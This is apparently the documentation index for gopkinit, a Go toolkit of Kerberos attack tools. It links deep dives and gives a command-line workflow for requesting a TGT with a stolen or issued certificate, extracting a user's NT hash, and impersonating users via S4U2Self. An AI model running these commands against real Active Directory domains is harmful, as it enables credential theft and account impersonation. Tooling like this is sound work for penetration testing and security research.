# gopkinit Documentation

Comprehensive documentation for the gopkinit Kerberos attack tools.

## Deep Dives

| Tool | Description | Documentation |
|------|-------------|---------------|
| **gettgtpkinit** | Certificate-based TGT request via PKINIT | [Deep Dive](gettgtpkinit.md) |
| **getnthash** | NT hash extraction via U2U authentication | [Deep Dive](getnthash.md) |
| **gets4uticket** | S4U2Self user impersonation | [Deep Dive](gets4uticket.md) |

## Quick Reference

### Workflow

```bash
# Step 1: Build (using Makefile)
make

# Step 2: Get TGT with certificate (PKINIT)
./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache

# Step 3a: Extract NT hash from PKINIT TGT
./getnthash -ccache output.ccache -key <asrep-key> -dc-ip 10.0.0.1

# Step 3b: OR impersonate another user (requires delegation)
./gets4uticket -ccache admin.ccache -impersonate user@DOMAIN.COM \
  -spn cifs/server@DOMAIN.COM -dc-ip 10.0.0.1 -out user.ccache
```

### Prerequisites

- **Time sync**: Run `ntpdate <dc-ip>` before any Kerberos operations
- **Certificate**: Valid X.509 certificate (PFX format) for PKINIT
- **Delegation**: S4U2Self requires proper delegation configuration

## Protocols Implemented

- **RFC 4556** - PKINIT (Public Key Cryptography for Initial Authentication)
- **RFC 4757** - RC4-HMAC Kerberos Encryption
- **MS-SFU** - Services for User Extensions (S4U2Self)
- **MS-PAC** - Privilege Attribute Certificate

## See Also

- [Main README](../README.md) for library usage and API documentation
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - Python reference implementation
- [minikerberos](https://github.com/skelsec/minikerberos) - Python Kerberos library

## Testing

```bash
# Run all unit tests
go test ./... -v
```
